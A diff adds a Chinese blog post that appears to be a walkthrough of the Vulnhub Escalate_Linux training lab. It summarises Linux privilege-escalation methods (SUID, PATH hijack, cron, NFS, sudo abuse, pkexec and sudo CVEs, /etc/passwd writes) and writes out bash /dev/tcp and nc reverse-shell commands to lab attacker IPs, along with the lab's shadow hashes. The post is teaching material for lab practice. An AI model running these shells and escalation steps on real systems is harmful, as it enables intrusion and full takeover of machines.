@@ -17,6 +17,207 @@
 <script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
+    <title>Escalate_Linux</title>
+    <url>/posts/c474af54/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在日常渗透测试过程中，通常会先拿到webshell，当拿到的权限过低时，需要提升权限近一步渗透。本篇将以Vulnhub的<a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">Escalate_Linux</a>靶场为例，总结一下linux环境下常见的提权方法。</p>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>探测发现主机 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscovert -r 192.168.80.1/24</span><br></pre></td></tr></table></figure>
+
+<p>找到靶机IP 192.168.80.53 （由于网络变动 靶机ip后面会变化）</p>
+<p>端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -Pn -sV 192.168.80.53</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:94930f0a253a4c92ff1f902734f63eb9" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/94930f0a253a4c92ff1f902734f63eb9.png" alt="截图"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sVC -p- 192.168.80.53</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:39e91f782fa7b4cb47a3bc998e536e37" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/39e91f782fa7b4cb47a3bc998e536e37.png" alt="截图"></p>
+<p>存在http web服务、139、445、smb、nfs</p>
+<p>先看下http服务</p>
+<p>访问为Apache 默认页面  dirsearch 扫下目录  </p>
+<p><img src="/posts/c474af54/attachment:5faefc7f5a065601e96c0591c39093f8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/5faefc7f5a065601e96c0591c39093f8.png" alt="截图"></p>
+<p>发现存在 shell.php  普通用户权限</p>
+<p><img src="/posts/c474af54/attachment:784f5ab67cc5fad33e9cf5229f5cba45" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/784f5ab67cc5fad33e9cf5229f5cba45.png" alt="截图"></p>
+<p><img src="/posts/c474af54/attachment:320f2f6f2f837a9e3ed2d71aca89af52" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/320f2f6f2f837a9e3ed2d71aca89af52.png" alt="截图"></p>
+<p><img src="/posts/c474af54/attachment:082ea51331a7f3fb0c5ad2da6da3e829" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/082ea51331a7f3fb0c5ad2da6da3e829.png" alt="截图"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>利用nc 反弹bash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.80.56/3344 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>利用burpsuite 进行url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%38%30%2e%37%33%2f%33%33%34%34%20%3e%26%31%27 </span><br></pre></td></tr></table></figure>
+
+<p>反弹得到shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /shell.php?cmd=%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%38%30%2e%35%36%2f%33%33%34%34%20%30%3e%26%31%27 </span><br><span class="line">HTTP/1.1</span><br><span class="line">Host: 192.168.80.53</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:f790198318d6609601f07e5740f24ca2" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/f790198318d6609601f07e5740f24ca2.png" alt="截图"></p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="0x00-LinEnum脚本枚举"><a href="#0x00-LinEnum脚本枚举" class="headerlink" title="0x00 LinEnum脚本枚举"></a>0x00 LinEnum脚本枚举</h4><p><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a></p>
+<p><img src="/posts/c474af54/attachment:9aa3d1c884bddf01c9018fd19435ba30" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/9aa3d1c884bddf01c9018fd19435ba30.png" alt="截图"></p>
+<h4 id="0x01-SUID提权"><a href="#0x01-SUID提权" class="headerlink" title="0x01 SUID提权"></a>0x01 SUID提权</h4><p><img src="/posts/c474af54/attachment:d6f26b099d84f99e220ab628f847a8e8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/d6f26b099d84f99e220ab628f847a8e8.png" alt="截图"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:26b748ad262da271a6c711562135cfc3" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/26b748ad262da271a6c711562135cfc3.png" alt="截图"></p>
+<p>user3下 执行可直接得到root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/user3 </span><br><span class="line">ls -l</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:176f980f1664bc1f90c0aa7afb639c6a" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/176f980f1664bc1f90c0aa7afb639c6a.png" alt="截图"></p>
+<p><img src="/posts/c474af54/attachment:d35b162929866a2a5bc12bf8d5fa9237" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/d35b162929866a2a5bc12bf8d5fa9237.png" alt="截图"></p>
+<p>除了shell之外 还存在一个root权限且具有写入权限的 .script.sh 脚本 利用该脚本将bash写到tmp下并给予s权限</p>
+<p><img src="/posts/c474af54/attachment:daa3614e8e8848928186e9971a067ed8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/daa3614e8e8848928186e9971a067ed8.png" alt="截图"></p>
+<p>echo “cp /bin/bash /tmp/sh” &gt; .script.sh echo “chmod +s /tmp/sh” &gt; .script.sh</p>
+<p><img src="/posts/c474af54/attachment:e7006cbfd204060997512aeb7aa744be" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e7006cbfd204060997512aeb7aa744be.png" alt="截图">    </p>
+<p>./shell</p>
+<p><img src="/posts/c474af54/attachment:31d18615d165604e35a7cebc4f344323" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/31d18615d165604e35a7cebc4f344323.png" alt="截图"></p>
+<p>./sh -p</p>
+<p><img src="/posts/c474af54/attachment:b1588e89ae861b651cf5a8be3909943c" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/b1588e89ae861b651cf5a8be3909943c.png" alt="截图"></p>
+<h4 id="0x02-环境变量提权"><a href="#0x02-环境变量提权" class="headerlink" title="0x02 环境变量提权"></a>0x02 环境变量提权</h4><p>在user5下 也存在s    权限的 script 文件</p>
+<p>运行后功能 等同于 ls</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ls</span><br><span class="line">chmod 777 ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:3683702f1e958e4ae63d29ab57f2f702" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3683702f1e958e4ae63d29ab57f2f702.png" alt="截图"></p>
+<p><img src="/posts/c474af54/attachment:76cb7fa7b526dde9a194c55ab52b7c01" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/76cb7fa7b526dde9a194c55ab52b7c01.png" alt="截图"></p>
+<h4 id="0x03-Pkexec提权"><a href="#0x03-Pkexec提权" class="headerlink" title="0x03 Pkexec提权"></a>0x03 Pkexec提权</h4><p><a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py</a></p>
+<p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
+<p>前面发现有python3环境 直接尝试python3的poc</p>
+<p><img src="/posts/c474af54/attachment:e5bbbde063cb63ba9fb8daf9bae3fea3" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e5bbbde063cb63ba9fb8daf9bae3fea3.png" alt="截图"></p>
+<p>由于也存在gcc环境  可以下载c版本 然后make编译运行</p>
+<p><img src="/posts/c474af54/attachment:3dce7fca2f3771cc7eca0d6d2de137b3" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3dce7fca2f3771cc7eca0d6d2de137b3.png" alt="截图"></p>
+<h4 id="0x04-Mysql弱口令信息泄露"><a href="#0x04-Mysql弱口令信息泄露" class="headerlink" title="0x04 Mysql弱口令信息泄露"></a>0x04 Mysql弱口令信息泄露</h4><p>根据linEnum 找到mysql弱口令  root/root</p>
+<p><img src="/posts/c474af54/attachment:85454cede9f9ede13abcf5c46c06c18a" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/85454cede9f9ede13abcf5c46c06c18a.png" alt="截图"></p>
+<p>得到一个账号密码  前面cat /etc/passwd时 发现存在mysql用户 </p>
+<p>使用该用户密码 可以登录</p>
+<p>find / -user  mysql  查看mysql用户下所属文件</p>
+<p><img src="/posts/c474af54/attachment:4f86485d7a014236d4c0da8997dbfe66" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/4f86485d7a014236d4c0da8997dbfe66.png" alt="截图"></p>
+<p>cat /etc/mysql/secret.cnf  得到root用户的登录密码 【但是该密码并无法登录到root用户】</p>
+<p><img src="/posts/c474af54/attachment:fc515af20eda2b650b1fe5ad634d85d8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/fc515af20eda2b650b1fe5ad634d85d8.png" alt="截图"></p>
+<p>/var/mysql/.informations 没权限 需要root权限才可以</p>
+<p>通过前面的pkexec 的root权限查看该文件 得到user2~user8的登录密码  user{i}@12345</p>
+<p><img src="/posts/c474af54/attachment:786d81cf96178ab0df36bdf054416ee8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/786d81cf96178ab0df36bdf054416ee8.png" alt="截图"></p>
+<h4 id="0x05-Corntab提权"><a href="#0x05-Corntab提权" class="headerlink" title="0x05 Corntab提权"></a>0x05 Corntab提权</h4><p>cat /etc/crontab 发现在user4下存在root权限的定时任务</p>
+<p><img src="/posts/c474af54/attachment:582472a05e2291085421362b71769f72" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/582472a05e2291085421362b71769f72.png" alt="截图"></p>
+<p>先切换到user4用户下 </p>
+<p><img src="/posts/c474af54/attachment:8826051f156c1a996ed0950c5e9ff665" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/8826051f156c1a996ed0950c5e9ff665.png" alt="截图"></p>
+<p>autoscript.sh 在user4下具有写权限 </p>
+<p>用echo 覆写进去 反弹nc shell</p>
+<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’   </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.80.60/8899 0&gt;&amp;1&#x27;  </span><br></pre></td></tr></table></figure>
+
+<p>中间有 ‘  不太好处理  利用管道处理 mkfifo</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;mkfifo /tmp/tmpipe;  nc 192.168.80.60 8899 0&lt;/tmp/tmpipe | /bin/bash &gt; /tmp/tmpipe 2&gt;&amp;1; rm /tmp/tmpipe&#x27; &gt; autoscript.sh</span><br><span class="line">./autoscript.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:e583500b9bd49f8f17f6c5d8e6649d57" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e583500b9bd49f8f17f6c5d8e6649d57.png" alt="截图"></p>
+<p>得到user4用户 但是是root权限</p>
+<p><img src="/posts/c474af54/attachment:83f91e6debac4dcc69df911bdc3c239f" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/83f91e6debac4dcc69df911bdc3c239f.png" alt="截图"></p>
+<h4 id="0x06-NFS挂载提权【未成功】"><a href="#0x06-NFS挂载提权【未成功】" class="headerlink" title="0x06 NFS挂载提权【未成功】"></a>0x06 NFS挂载提权【未成功】</h4><p>前面nmap扫端口时候 发现有nfs服务</p>
+<p>利用LinEnum收集也找到了nfs相关信息</p>
+<p>/home/user5目录下开启了 no_root_squash</p>
+<p><img src="/posts/c474af54/attachment:6d355031cd6c43eb447e8213f0833a7d" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/6d355031cd6c43eb447e8213f0833a7d.png" alt="截图"></p>
+<p>1.查看NFS服务器上的共享目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo showmount -e 192.168.80.56</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:a7b3a912ff51397434d18c082b133d54" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/a7b3a912ff51397434d18c082b133d54.png" alt="截图"></p>
+<p>2.创建本地挂载目录 挂载共享目录  利用攻击机kali本地root权限创建suid shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /tmp/data</span><br><span class="line"></span><br><span class="line">sudo mount -t nfs 192.168.80.56:/home/user5  /tmp/data</span><br><span class="line"></span><br><span class="line">sudo cp /bin/sh  /tmp/data/shell</span><br><span class="line"></span><br><span class="line">sudo chmod u+s /tmp/data/shell</span><br></pre></td></tr></table></figure>
+
+<p>但是不管尝试bash 还是sh 都会报错 libtinfo.so文件缺失</p>
+<p>(在ubuntu18下 经常会出现该问题 在ubuntu20下则不会有  由于靶机是ubuntu版本所以会报错缺失so文件)</p>
+<p><img src="/posts/c474af54/attachment:9e2d8c564912663dcc3a3e4ee181e751" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/9e2d8c564912663dcc3a3e4ee181e751.png" alt="截图"></p>
+<h4 id="0x07-john-爆破密码"><a href="#0x07-john-爆破密码" class="headerlink" title="0x07 john 爆破密码"></a>0x07 john 爆破密码</h4><p>通过前面提权方式  cat /etc/shadow</p>
+<p>获取相关用户shadow信息 前面通过数据库已得到了user1-8的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</span><br><span class="line">user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::</span><br><span class="line">user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::</span><br><span class="line">user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::</span><br><span class="line">user4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::</span><br><span class="line">user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::</span><br><span class="line">user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::</span><br><span class="line">mysql:$6$O2ymBAYF$NZDtY392guzYrveKnoISea6oQpv87OpEjEef5KkEUqvtOAjZ2i1UPbkrfmrHG/IonKdnYEec0S0ZBcQFZ.sno/:18053:0:99999:7:::</span><br><span class="line">user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::</span><br><span class="line">user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>john shadow.txt</p>
+<p>得到root用户密码为 12345</p>
+<p><img src="/posts/c474af54/attachment:3e5c34d015669144524e073997b6290b" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3e5c34d015669144524e073997b6290b.png" alt="截图"></p>
+<p>成功登录到root用户</p>
+<p><img src="/posts/c474af54/attachment:1ac6b364e251fd2be2a7d968e082c14c" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/1ac6b364e251fd2be2a7d968e082c14c.png" alt="截图"></p>
+<h4 id="0x08-sudo提权1-—-vi-提权"><a href="#0x08-sudo提权1-—-vi-提权" class="headerlink" title="0x08  sudo提权1 — vi 提权"></a>0x08  sudo提权1 — vi 提权</h4><p>登录user8  sudo -l </p>
+<p><img src="/posts/c474af54/attachment:10cc90cd82f2e5d2c0ede1393eba99c5" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/10cc90cd82f2e5d2c0ede1393eba99c5.png" alt="截图"></p>
+<p>vi 提权  参考 <a href="https://gtfobins.github.io/gtfobins/vi/">https://gtfobins.github.io/gtfobins/vi/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi </span><br><span class="line">:!sh </span><br><span class="line">或者</span><br><span class="line">sudo vi</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:47c0ea209eb2ab89e9e8f050dbe3c484" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/47c0ea209eb2ab89e9e8f050dbe3c484.png" alt="截图"></p>
+<p><img src="/posts/c474af54/attachment:0ee35a1a8389a3f7be0d119570066355" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/0ee35a1a8389a3f7be0d119570066355.png" alt="截图"></p>
+<h4 id="0x09-sudo提权-2"><a href="#0x09-sudo提权-2" class="headerlink" title="0x09 sudo提权 2"></a>0x09 sudo提权 2</h4><p>登录到user2 </p>
+<p>sudo -l </p>
+<p><img src="/posts/c474af54/attachment:ed45f5c91b693f398b9d78415e9f6137" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/ed45f5c91b693f398b9d78415e9f6137.png" alt="截图"></p>
+<p>user2下所以  user1均具有权限</p>
+<p>登录到user1 sudo -l</p>
+<p><img src="/posts/c474af54/attachment:a814e593c544373206b840a1bcec7950" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/a814e593c544373206b840a1bcec7950.png" alt="截图"></p>
+<p>user1 具有所有权限   可直接su 登录root</p>
+<h4 id="0x0a-sudo堆缓冲区溢出提权"><a href="#0x0a-sudo堆缓冲区溢出提权" class="headerlink" title="0x0a sudo堆缓冲区溢出提权"></a>0x0a sudo堆缓冲区溢出提权</h4><p>sudo -V </p>
+<p><img src="/posts/c474af54/attachment:0b9db52b928c8be4e42773ae56c54197" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/0b9db52b928c8be4e42773ae56c54197.png" alt="截图"></p>
+<p>该版本存在sudo 堆缓冲区溢出漏洞</p>
+<p>影响版本在 </p>
+<ul>
+<li>Sudo 1.8.2 - 1.8.31p2</li>
+<li>Sudo 1.9.0 - 1.9.5p1</li>
+</ul>
+<p>POC : <a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">https://github.com/Rvn0xsy/CVE-2021-3156-plus</a> </p>
+<p>通过前面nfs挂载 直接在kali下下载poc 拷贝到user5目录下 make编译</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/expolit &quot;id&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:2880a7402f7c4210518eb33e87c2c1c4" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/2880a7402f7c4210518eb33e87c2c1c4.png" alt="截图"></p>
+<h4 id="0x0b-root用户组提权-—-写入-etc-passwd"><a href="#0x0b-root用户组提权-—-写入-etc-passwd" class="headerlink" title="0x0b root用户组提权  — 写入/etc/passwd"></a>0x0b root用户组提权  — 写入/etc/passwd</h4><p><code>cat /etc/group </code> 查看用户组</p>
+<p><img src="/posts/c474af54/attachment:914fe068e9208e26fbaf1fb37c59d12e" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/914fe068e9208e26fbaf1fb37c59d12e.png" alt="截图"></p>
+<p>用户user4 user7 可以修改 /etc/passwd 写入新建用户</p>
+<p>在kali下利用openssl </p>
+<p><img src="/posts/c474af54/attachment:bd93e89c27d81a9bddee7d519689fbe1" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/bd93e89c27d81a9bddee7d519689fbe1.png" alt="截图"></p>
+<p>openssl passwd -1 -salt test test</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$1$test$pi/xDtU5WFVRqYS6BMU8X/</span><br><span class="line">echo &#x27;test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:c196a2bbdcaeb87acdf306ad8f49017c" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/c196a2bbdcaeb87acdf306ad8f49017c.png" alt="截图"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><h4 id="1-内核漏洞提权"><a href="#1-内核漏洞提权" class="headerlink" title="1.内核漏洞提权"></a>1.内核漏洞提权</h4><p>根据内核版本找对应版本的漏洞进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看系统发行版本</span><br><span class="line">lsb_release -a  </span><br><span class="line"># 查看内核版本</span><br><span class="line">uname -a </span><br></pre></td></tr></table></figure>
+
+<h4 id="2-SUID提权"><a href="#2-SUID提权" class="headerlink" title="2.SUID提权"></a>2.SUID提权</h4><p>SUID可以让程序调用者以文件所有者身份运行该文件，当我们以普通用户去运行一个root用户所有的SUID文件，那么运行该文件后就可以获取到root权限。</p>
+<p>查找具有s权限的文件</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null </p>
+<h4 id="3-sudo提权"><a href="#3-sudo提权" class="headerlink" title="3.sudo提权"></a>3.sudo提权</h4><p>普通用户在使用sudo执行命令时，将会以root方式执行命令。在很多场景下通过配置sudoer文件可实现免密以root权限运行。通过sudo -l 查找用户下高权限第三方应用，可借助<a href="https://gtfobins.github.io/">GTFOBins</a>进行提权。</p>
+<h4 id="4-计划任务提权"><a href="#4-计划任务提权" class="headerlink" title="4.计划任务提权"></a>4.计划任务提权</h4><p>系统中可能会有一些定时执行的任务，这些任务都由crontab管理，可通过<code>cat /etc/crontab</code>查看计划任务，检查是否存在可以利用的文件，其本质就是文件权限配置不当。</p>
+<h4 id="5-环境变量提权"><a href="#5-环境变量提权" class="headerlink" title="5. 环境变量提权"></a>5. 环境变量提权</h4><p>当在目标机器查到具有SUID权限的编译文件，则可以通过以下方法获取管理员权限</p>
+<ul>
+<li>1.echo命令法</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ls</span><br><span class="line">chmod 777 ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>2.cp 法</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/user5/</span><br><span class="line">cp /bin/sh /tmp/ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>3.软连接法(在此靶场中无法利用)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /bin/sh /tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-第三方服务提权"><a href="#6-第三方服务提权" class="headerlink" title="6.第三方服务提权"></a>6.第三方服务提权</h4><h5 id="6-1-NFS提权"><a href="#6-1-NFS提权" class="headerlink" title="6.1 NFS提权"></a>6.1 NFS提权</h5><p>当服务器中存在nfs共享，且开启了<strong><strong>no_root_squash</strong></strong>时[可通过 cat /etc/exports查看]，如果客户端使用的是root用户，那么对于共享目录来说就有root权限，以此提升权限。</p>
+<ul>
+<li>1.查看NFS服务器共享目录</li>
+<li>2.创建本地挂载目录 挂载共享目录，利用攻击者本地root权限创建suid shell</li>
+<li>3.在服务器中以普通用户运行shell -p  以获取root权限</li>
+</ul>
+<h5 id="6-2-数据库提权"><a href="#6-2-数据库提权" class="headerlink" title="6.2 数据库提权"></a>6.2 数据库提权</h5><p>Mysql数据库提权有UDF提权、MOF提权、写入启动项等方式来提权，较为常见是则是UDF提权，具体步骤可分如下几步：</p>
+<ul>
+<li>1.连接数据库</li>
+<li>2.创建自定义函数</li>
+<li>3.设置自定义函数权限</li>
+<li>4.执行自定义函数以获取root权限</li>
+</ul>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p><a href="https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md#Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E">https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md#Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E</a></p>
+]]></content>
+      <categories>
